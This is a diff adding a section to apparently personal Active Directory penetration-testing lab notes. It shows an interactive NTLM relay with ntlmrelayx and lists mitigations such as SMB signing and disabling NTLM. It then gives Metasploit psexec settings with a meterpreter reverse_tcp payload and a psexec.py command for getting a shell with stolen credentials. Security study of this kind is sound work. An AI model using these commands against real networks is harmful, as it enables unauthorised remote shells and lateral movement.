@@ -304,4 +304,66 @@ impacket-ntlmrelayx -tf targets.txt -smb2support
 ![](imgs/addsimg10.png)
 
 
+**Making Shell Interactive to us**!
+
+- modifying `ntlmrelayx` command, we'll add -i option to make it interactive:
+```
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+```
+
+**Mitigation Strategies**:
+
+- Enable SMB Signing on all devices
+    - Pro: Completely stops the attack
+    - Con: Can cause performance issues with file copies
+- Disable NTLM authentication on network
+    - Pro: Completely stops the attack
+    - Con: If Kerberos stops working, Windows defaults back to NTLM
+- Account tiering:
+    - Pro: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
+    - Con: Enforcing the policy may be difficult
+- Local admin restiction:
+    - Pro: Can prevent a lot of lateral movement
+    - Con: Potential increase in the amount of service desk tickets
+
+**Gaining Shell Access**:
+
+- `Using metasploit console`:
+
+- If smb open and we have username & password, then we can use that username & password, and specially they have a machine where the user is a local administrator, we can use this to get the shell.
+
+```
+search psexec
+```
+
+```
+set rhosts <your-target-machine-ip>
+```
+
+```
+set smbdomain <yourdomain>
+```
+
+```
+set smbpass <yourpassword>
+```
+
+```
+set smbuser <yourusername>
+```
+
+```
+set payload windows/x64/meterpreter/reverse_tcp
+```
+
+```
+set lhost eth0
+```
+
+- if `psexec` got blocked, then we could give a try to `psexec.py`
+
+```
+psexec.py marvel.local/<username>:<password>@<target-ip>
+```
+
 
